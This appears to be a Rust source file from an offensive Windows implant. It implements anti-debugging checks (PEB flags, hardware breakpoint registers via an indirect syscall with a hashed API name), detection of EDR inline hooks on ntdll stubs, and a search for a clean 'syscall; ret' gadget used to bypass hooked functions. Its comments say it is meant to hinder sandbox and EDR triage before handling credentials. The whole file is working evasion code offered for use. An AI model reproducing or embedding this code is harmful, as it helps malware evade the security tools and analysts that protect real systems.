// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
//
//! Defensive-evasion primitives. Each helper is best-effort — none of them
//! stop a determined analyst, but together they raise the cost of routine
//! sandbox/EDR triage. Use them at sensitive entry points (before resolving
//! the first syscall, before printing creds, before exiting with state).
//!
//! Public API:
//!   - `is_being_debugged()` — PEB.BeingDebugged + NtGlobalFlag heuristic.
//!   - `has_hardware_breakpoints()` — non-zero Dr0..Dr3 of the current thread.
//!   - `secure_zero(buf)`  — volatile-write zeros (won't be optimized out).
//!   - `find_universal_syscall_gadget(ntdll)` — any clean `syscall; ret`
//!     gadget address inside ntdll, suitable as a fallback for hooked stubs.
//!   - `is_stub_hooked(stub)` — heuristic check for inline patch on first 16 B.

#![cfg(all(target_os = "windows", target_arch = "x86_64"))]

use core::ffi::c_void;

/// Read PEB.BeingDebugged (offset 0x02). Returns `true` if a user-mode
/// debugger is attached.
#[inline]
pub unsafe fn is_being_debugged() -> bool {
    let peb: *const u8;
    unsafe {
        core::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nomem, nostack, preserves_flags));
        let being_debugged = core::ptr::read_volatile(peb.add(0x02));
        if being_debugged != 0 {
            return true;
        }
        // PEB.NtGlobalFlag (offset 0xBC on x64). Set bits indicate heap
        // debugging flags injected by ProcessHeap-style instrumentation.
        let nt_global_flag = core::ptr::read_volatile(peb.add(0xBC) as *const u32);
        // FLG_HEAP_ENABLE_TAIL_CHECK (0x10) | FLG_HEAP_ENABLE_FREE_CHECK (0x20)
        // | FLG_HEAP_VALIDATE_PARAMETERS (0x40) — set together by debug heaps.
        nt_global_flag & 0x70 == 0x70
    }
}

/// Check Dr0..Dr3 of the current thread. Non-zero values indicate a hardware
/// breakpoint set by a debugger or instrumentation. Best-effort: we read
/// the *thread* CONTEXT via `NtGetContextThread` indirectly by inspecting
/// our own task's stored regs is not portable — we fall back to a conservative
/// "always false" if we cannot probe safely. Callers should treat `true` as
/// a strong signal but `false` as inconclusive.
///
/// Implementation: indirect-syscall path to `NtGetContextThread` against
/// the current thread (pseudo-handle `(HANDLE)-2`).
pub unsafe fn has_hardware_breakpoints() -> bool {
    use crate::syscalls::{SyscallEntry, resolve, do_syscall4};
    static ENTRY: SyscallEntry = SyscallEntry::new();
    const HASH: u32 = crate::hash::djb2(b"NtGetContextThread");

    let (ssn, addr) = match unsafe { resolve(&ENTRY, HASH) } {
        Ok(v) => v,
        Err(_) => return false,
    };

    // CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 (0x100000) | 0x10
    const CONTEXT_DEBUG_REGISTERS: u32 = 0x0010_0010;

    // CONTEXT (x64) is 0x4D0 bytes; we only read Dr0..Dr3 at offset 0x48..0x60.
    // We over-allocate to satisfy the kernel's size check, and require 16-byte
    // alignment (CONTEXT contains __m128 fields).
    #[repr(align(16))]
    struct CtxBuf([u8; 0x4D0]);
    let mut ctx = CtxBuf([0u8; 0x4D0]);
    // ContextFlags lives at offset 0x30 on x64
    core::ptr::write_unaligned(ctx.0.as_mut_ptr().add(0x30) as *mut u32, CONTEXT_DEBUG_REGISTERS);

    let current_thread: usize = (-2isize) as usize; // GetCurrentThread pseudo-handle
    let status = unsafe {
        do_syscall4(
            current_thread,
            ctx.0.as_mut_ptr() as usize,
            0, 0,
            ssn, addr,
        )
    };
    if status < 0 { return false; }

    let dr0 = core::ptr::read_unaligned(ctx.0.as_ptr().add(0x48) as *const u64);
    let dr1 = core::ptr::read_unaligned(ctx.0.as_ptr().add(0x50) as *const u64);
    let dr2 = core::ptr::read_unaligned(ctx.0.as_ptr().add(0x58) as *const u64);
    let dr3 = core::ptr::read_unaligned(ctx.0.as_ptr().add(0x60) as *const u64);
    (dr0 | dr1 | dr2 | dr3) != 0
}

/// Volatile-write zeros to every byte. Will not be optimized away by LLVM
/// because of the `read_volatile` round-trip on each iteration.
#[inline]
pub fn secure_zero(buf: &mut [u8]) {
    for b in buf.iter_mut() {
        unsafe { core::ptr::write_volatile(b as *mut u8, 0); }
    }
    // Compiler fence so subsequent code can't re-order before the writes.
    core::sync::atomic::fence(core::sync::atomic::Ordering::SeqCst);
}

/// Same as `secure_zero` for any `T: Sized` allocated on the stack.
#[inline]
pub unsafe fn secure_zero_typed<T>(p: *mut T) {
    let len = core::mem::size_of::<T>();
    let bytes = core::slice::from_raw_parts_mut(p as *mut u8, len);
    secure_zero(bytes);
}

/// Heuristic: "is this Nt stub hooked?"
///
/// A clean Nt stub starts with `4C 8B D1 B8 SS SS 00 00` (mov r10,rcx;
/// mov eax,imm32). Anything else (jmp/call/push/mov rax) in the first 4
/// bytes likely indicates an inline hook by an EDR.
#[inline]
pub unsafe fn is_stub_hooked(stub: *const u8) -> bool {
    let b = unsafe { core::slice::from_raw_parts(stub, 4) };
    !(b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8)
}

/// Scan ntdll's text section for any clean `syscall; ret` (0x0F 0x05 0xC3)
/// gadget. Used as a universal jump target so even when the *target* stub
/// is hooked, we route the SSN through a *different* (clean) stub's syscall
/// instruction. Falls back to walking exports if we cannot find a gadget
/// in the first export's stub.
pub unsafe fn find_universal_syscall_gadget(ntdll: *mut c_void) -> Option<usize> {
    let base = ntdll as *const u8;
    let dos = base as *const u8;
    let e_lfanew = unsafe { core::ptr::read_unaligned(dos.add(0x3C) as *const i32) };
    let nt = unsafe { base.add(e_lfanew as usize) };
    // Optional header at +0x18, data dir [0]=Export at +0x70 from optional header
    // Export RVA is at NT + 0x18 + 0x70 = NT + 0x88 on PE32+
    let export_rva = unsafe { core::ptr::read_unaligned(nt.add(0x88) as *const u32) };
    if export_rva == 0 { return None; }
    let exp = unsafe { base.add(export_rva as usize) };
    // address_of_functions @ +0x1C, number_of_functions @ +0x14
    let n_funcs   = unsafe { core::ptr::read_unaligned(exp.add(0x14) as *const u32) } as usize;
    let funcs_rva = unsafe { core::ptr::read_unaligned(exp.add(0x1C) as *const u32) } as usize;
    let funcs = unsafe { base.add(funcs_rva) as *const u32 };

    // Walk exports; for each one, scan the first 64 bytes for `0F 05 C3`.
    // (Many ntdll Nt* stubs end with `syscall; ret`.)
    for i in 0..n_funcs.min(4096) {
        let rva = unsafe { *funcs.add(i) };
        if rva == 0 { continue; }
        let stub = unsafe { base.add(rva as usize) };
        if unsafe { is_stub_hooked(stub) } { continue; }
        // Clean stub — look for `syscall; ret` (0x0F 0x05 0xC3) in next 64 bytes.
        for off in 0..60usize {
            let b0 = unsafe { *stub.add(off) };
            let b1 = unsafe { *stub.add(off + 1) };
            let b2 = unsafe { *stub.add(off + 2) };
            if b0 == 0x0F && b1 == 0x05 && b2 == 0xC3 {
                return Some(stub as usize + off);
            }
        }
    }
    None
}
